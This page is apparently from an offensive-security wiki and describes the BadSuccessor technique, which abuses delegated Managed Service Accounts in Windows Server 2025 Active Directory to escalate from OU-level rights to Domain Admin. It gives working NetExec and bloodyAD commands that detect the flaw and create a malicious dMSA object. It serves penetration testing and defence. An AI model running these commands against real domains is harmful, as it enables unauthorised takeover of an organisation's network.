# 🛠️ BadSuccessor (dMSA abuse)

## Theory

In Windows Server 2025, Microsoft introduced [delegated Managed Service Accounts (dMSAs).](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/delegated-managed-service-accounts/delegated-managed-service-accounts-overview) A dMSA is a new type of service account in Active Directory (AD) that expands on the capabilities of [group Managed Service Accounts](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/group-managed-service-accounts/group-managed-service-accounts/group-managed-service-accounts-overview) (gMSAs).&#x20;

If we have **`GenericAll`**, **`CreateChild`**, **`WriteDACL`**, or **`WriteOwner`** permissions on _any_ OU—or can modify an existing dMSA, we can escalate from low-level access to full Domain Admin via the **BadSuccessor** technique.

{% hint style="warning" %}
**Exploiting this vector does not require the domain to actively use dMSAs.** The feature is automatically enabled in any domain that includes at least one Windows Server 2025 domain controller, and its presence alone is enough to make the attack path viable.
{% endhint %}

## Practice

{% tabs %}
{% tab title="UNIX-like" %}
[NetExec](https://github.com/Pennyw0rth/NetExec) (Python) can be used to enulerate  if a a target is vulnerable to bad successor attack&#x20;

```bash
netexec ldap $DC_IP -u $USER -p $PASSWORD -M badsuccessor
```

We can  then exploit it using [BloodyAd](https://github.com/CravateRouge/bloodyAD) (Python).

```bash
# Enumerate writable attributes for the user we are authenticating as
bloodyAD -d $DOMAIN_FQDN -u $USER -p $PASSWORD --host $DC_FQDN get writable --detail

# BadSuccessor attack to create the dMSA object called dmsa_pwn
bloodyAD -d $DOMAIN_FQDN -u $USER -p $PASSWORD --host $DC_FQDN add badSuccessor dmsa_pwn
```
{% endtab %}

{% tab title="Windows" %}
TODO
{% endtab %}
{% endtabs %}

## Resources

{% embed url="https://www.akamai.com/blog/security-research/abusing-dmsa-for-privilege-escalation-in-active-directory" %}

{% embed url="https://specterops.io/blog/2025/05/27/understanding-mitigating-badsuccessor/" %}
